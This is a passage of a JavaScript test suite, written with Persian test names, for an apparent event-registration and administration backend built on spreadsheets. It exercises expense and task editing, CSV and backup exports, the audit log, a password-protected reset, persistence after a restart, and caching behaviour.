  assert.equal(g.A('expense', { action: 'update', id: e.expense.id, title: 'اتوبوس ۲', amountToman: 3500000 }).ok, true);
  assert.equal(g.AG('data').stats.finance.expensesTotal, 3500000);
  assert.equal(g.A('expense', { action: 'delete', id: e.expense.id }).ok, true);
  assert.equal(g.AG('data').expenses.length, 0);
  const tasks = g.AG('data').tasks;
  assert.ok(tasks.length >= 5, 'چک‌لیست پیش‌فرض ساخته شده است');
  assert.equal(g.A('task', { action: 'toggle', id: tasks[0].id }).ok, true);
  assert.equal(g.AG('data').tasks[0].done, true);
  assert.equal(g.A('task', { action: 'toggle', id: tasks[0].id }).ok, true);
  assert.equal(g.AG('data').tasks[0].done, false);
  assert.equal(g.A('task', { action: 'delete', id: tasks[1].id }).ok, true);
  assert.equal(g.AG('data').tasks.length, tasks.length - 1);
});

test('خروجی‌ها (CSV و پشتیبان) و گزارش رویدادها', () => {
  const g = boot();
  openAt(g, T0);
  g.now = T0;
  [1, 2, 3].forEach((i) => g.post('register', Object.assign(person(i), { rid: rid(i) })));
  const all = g.AG('export', { kind: 'all' });
  assert.equal(all.ok, true); assert.ok(all._raw.startsWith('﻿')); assert.equal(all._raw.trim().split('\r\n').length, 4);
  const sec = g.AG('export', { kind: 'security' })._raw, ph = g.AG('export', { kind: 'phones' })._raw;
  assert.ok(sec.includes(person(2).nationalId)); assert.ok(ph.includes(person(2).phone));
  assert.ok(!ph.includes(person(2).nationalId));
  assert.equal(g.AG('export', { kind: 'junk' })._raw, all._raw, 'نوع ناشناخته به all برمی‌گردد');
  const bk = JSON.parse(g.AG('backup')._raw);
  assert.equal(bk.registrations.length, 3);
  assert.equal(bk.users, undefined, 'پشتیبان رمزهای درهم‌شده را ندارد');
  assert.ok(!g.AG('backup')._raw.includes('"hash"'));
  const au = g.AG('audit').audit;
  assert.ok(au.length >= 4);
  assert.ok(au.some((x) => x.act === 'export' && x.by === 'admin'));
  assert.ok(au.some((x) => x.act === 'login'));
  assert.ok(au[0].t >= au[au.length - 1].t, 'تازه‌ترین اول');
});

test('پاک‌سازی ثبت‌نام‌ها: نیاز به رمز و عبارت تأیید؛ ظرفیت دوباره باز می‌شود', () => {
  const g = boot();
  openAt(g, T0, { capacity: 2 });
  g.now = T0;
  [1, 2].forEach((i) => g.post('register', Object.assign(person(i), { rid: rid(i) })));
  assert.equal(g.get('status').phase, 'full');
  assert.equal(g.A('reset', { password: g.adminPw, phrase: 'اشتباه' }).code, 'CONFIRM');
  assert.equal(g.A('reset', { password: 'wrong-password', phrase: 'پاک شود' }).code, 'BAD_PASSWORD');
  assert.equal(regsSheetRows(g).length, 2);
  const r = g.A('reset', { password: g.adminPw, phrase: 'پاک شود' });
  assert.equal(r.ok, true); assert.equal(r.removed, 2);
  assert.equal(regsSheetRows(g).length, 0);
  const st = g.get('status');
  assert.equal(st.phase, 'open'); assert.equal(st.taken, 0);
  const again = g.post('register', Object.assign(person(1), { rid: rid(11) }));
  assert.equal(again.ok, true); assert.equal(again.registration.seq, 1, 'شماره‌گذاری از اول');
  assert.ok(g.AG('audit').audit.some((x) => x.act === 'reset'));
});

test('داده‌ها پس از «راه‌اندازی مجدد» (کش خالی، نمونه‌ی تازه‌ی اسکریپت) سالم می‌مانند', () => {
  const g = boot();
  openAt(g, T0, { capacity: 3, priceToman: 99000, whitelistEnabled: true });
  g.A('whitelist', { text: '40124001 40124002 40124003' });
  g.now = T0;
  [1, 2, 3].forEach((i) => g.post('register', Object.assign(person(i), { rid: rid(i) })));
  const id = g.AG('data').registrations[1].id;
  g.A('reg/' + id, { action: 'setPayment', payment: 'paid', ref: '12345' });
  g.A('reg/' + id, { action: 'checkIn' });
  const before = JSON.parse(JSON.stringify(g.AG('data')));
  g.cacheStore.clear();
  g.run('jrSs_ = null; jrSheets_ = {};');                  // نمونه‌ی تازه‌ی اجرای اسکریپت
  const lg = g.post('admin/login', { username: 'admin', password: g.adminPw });
  assert.equal(lg.ok, true);
  const after = g.post('admin/data', null, lg.token, null, 'GET');
  const strip = (d) => ({ regs: d.registrations, settings: d.settings, tasks: d.tasks, stats: Object.assign({}, d.stats, { serverTime: 0 }) });
  assert.deepEqual(strip(after).regs, strip(before).regs);
  assert.deepEqual(after.settings, before.settings);
  assert.deepEqual(after.tasks, before.tasks);
  assert.equal(after.registrations[1].payRef, '12345');
  assert.equal(after.registrations[1].checkedIn, true);
  assert.equal(g.get('status').phase, 'full');
});

test('بار پیمایش: ۲۰۰ درخواست وضعیت بعد از ۴۰ ثبت‌نام، تعداد خواندن Sheet را تقریباً ثابت نگه می‌دارد', () => {
  const g = boot();
  openAt(g, T0);
  for (let i = 1; i <= 40; i++) { g.now = T0 + i; g.post('register', Object.assign(person(i), { rid: rid(i) })); }
  g.get('status');
  const reads = g.stats.reads;
  for (let i = 0; i < 200; i++) g.get('status');
  assert.equal(g.stats.reads, reads);
  g.advance(31000);                                         // کش ۳۰ ثانیه‌ای تمام شد: فقط یک بازسازی
  g.get('status'); const r2 = g.stats.reads;
  for (let i = 0; i < 50; i++) g.get('status');
  assert.equal(g.stats.reads, r2);
  assert.ok(r2 - reads <= 4);
});

test('سابقه‌ی رویدادها: بریدن برگه‌ی گزارش بسیار بلند', () => {
  const g = boot();
  const sh = g.sheet(SHEET.audit);
  const rows = [];
  for (let i = 0; i < 3600; i++) rows.push([T0 + i, 'x', 'u', 'a', 'd']);
  sh.maxRows = 4000;
  sh.getRange(2, 1, rows.length, 5).setValues(rows);
  g.A('task', { action: 'add', title: 't' });
  g.A('expense', { action: 'add', title: 'x', amountToman: 1 });
  assert.ok(sh.getLastRow() < 3700);
  assert.equal(g.AG('audit').ok, true);
});
